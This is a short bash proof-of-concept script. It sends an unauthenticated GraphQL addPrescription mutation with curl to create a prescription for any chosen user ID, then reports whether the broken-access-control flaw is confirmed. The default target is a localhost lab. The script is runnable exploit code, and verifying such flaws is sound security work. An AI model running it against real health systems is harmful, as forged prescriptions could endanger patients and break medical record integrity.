#!/bin/bash

# POC: Unauthenticated GraphQL Prescription Creation
# This script demonstrates that the addPrescription GraphQL mutation
# can be executed without authentication, allowing any attacker to create
# prescriptions for any user ID.

TARGET_URL="${1:-http://localhost:5003/graphql}"
TARGET_USER_ID="${2:-1}"
PRESCRIPTION_DETAILS="${3:-Unauthenticated prescription created via GraphQL}"

echo "[*] Testing Unauthenticated Access to GraphQL addPrescription Mutation"
echo "[*] Target: $TARGET_URL"
echo "[*] Creating prescription for userId: $TARGET_USER_ID"
echo ""

# Execute the GraphQL mutation without any authentication headers
echo "[*] Sending unauthenticated addPrescription mutation..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"mutation(\$userId: Int!, \$details: String!) { addPrescription(userId: \$userId, prescriptionDetails: \$details) { prescription { id userId prescriptionDetails } } }\", \"variables\": {\"userId\": $TARGET_USER_ID, \"details\": \"$PRESCRIPTION_DETAILS\"}}")

echo "[*] Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if prescription was created successfully
if echo "$RESPONSE" | grep -q "id.*userId"; then
  echo "[+] SUCCESS: Prescription created without authentication!"
  echo "[+] This confirms the unauthenticated GraphQL mutation bypass vulnerability"
  exit 0
else
  echo "[-] FAILED: Could not create prescription"
  exit 1
fi